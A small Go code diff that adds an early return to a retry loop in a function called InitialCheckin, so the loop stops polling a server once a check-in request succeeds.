@@ -78,7 +78,10 @@ func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
 		if err != nil || resp != 200 {
 			
 			time.Sleep(60 * time.Second)
+		} else {
+			return
 		}
+
 	}
 }
 
